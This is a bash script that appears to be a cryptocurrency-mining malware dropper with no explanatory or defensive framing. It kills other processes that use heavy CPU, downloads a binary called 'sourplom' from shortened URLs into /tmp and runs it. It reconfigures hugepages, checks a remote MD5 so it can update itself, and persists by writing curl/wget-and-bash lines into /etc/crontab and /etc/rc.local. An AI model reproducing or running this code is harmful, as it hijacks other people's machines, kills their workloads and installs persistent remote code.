#!/bin/bash

function kills() {
	/bin/ps aux |grep -v sourplom | awk '{if($3>40.0) print $2}' | while read procid
	do
	kill -9 $procid
	done
}

function writecrontab() {
	xcrontab=$(cat /etc/crontab | grep "https://is.gd/qCUYPY" | grep -v grep |wc -l)
	if [ $xcrontab -eq 0 ];then
        echo "0 0 * * *   root    curl https://is.gd/qCUYPY -L > /tmp/l.sh ; wget -P /tmp/ https://is.gd/qCUYPY ; mv /tmp/qCUYPY  /tmp/l.sh -f ; rm /tmp/l.sh.* ; bash /tmp/l.sh &" >> /etc/crontab
	else
        echo ""
	fi
}

function writerc() {
	x=$(cat /etc/rc.local | grep "https://is.gd/qCUYPY" | grep -v grep | wc -l)
	if [ $x -eq 0 ];then
		$(sed -i "s/exit 0//g" /etc/rc.local) 
		$(sed -i "s/bash /tmp/lower.sh//g" /etc/rc.local) 
		echo "curl https://is.gd/qCUYPY -L > /tmp/l.sh ; wget -P /tmp/ https://is.gd/qCUYPY ; mv /tmp/qCUYPY  /tmp/l.sh -f ; rm /tmp/l.sh.* ; bash /tmp/l.sh" >> /etc/rc.local
		echo "exit 0" >> /etc/rc.local
	else
		echo ""
	fi
}

function hugepage() {
	echo 128 > /proc/sys/vm/nr_hugepages
	sysctl -w vm.nr_hugepages=128
}

function upgrade(){
	curl https://is.gd/jSVsVG -L > /tmp/md5
	wget https://is.gd/jSVsVG -O /tmp/md5
	rmd5=$(cat /tmp/md5)
	md5=$(md5sum river|awk '{print $1}')
	if [ $rmd5 == $md5 ];then
		return 0
	else
		return 1
	fi
}

function downloadyam() {
	if [ ! -f "/tmp/sourplom" ] || `upgrade` ;then
		/bin/ps aux |grep -v sourplom | awk '{if($3>20.0) print $2}' | while read procid
		do
		kill -9 $procid
		done
		curl https://is.gd/4WqtRG -L > /tmp/sourplom && chmod +x /tmp/sourplom
		if [ ! -f "/tmp/sourplom" ] ;then
			wget -P /tmp/ https://is.gd/4WqtRG && mv /tmp/4WqtRG /tmp/sourplom -f  && chmod +x /tmp/sourplom
			rm -rf /tmp/sourplom.*
		fi
		nohup /tmp/sourplom &
	else
		writecrontab
		writerc
		p=$(ps aux | grep sourplom | grep -v grep | wc -l)
		if [ ${p} -eq 1 ];then
			echo "sourplom"
		elif [ ${p} -eq 0 ];then
			nohup /tmp/sourplom &
		else
			echo ""
		fi
	fi
}

hugepage
cd /tmp/
while [ 1 ]
do
	kills
	downloadyam
	sleep 5
done
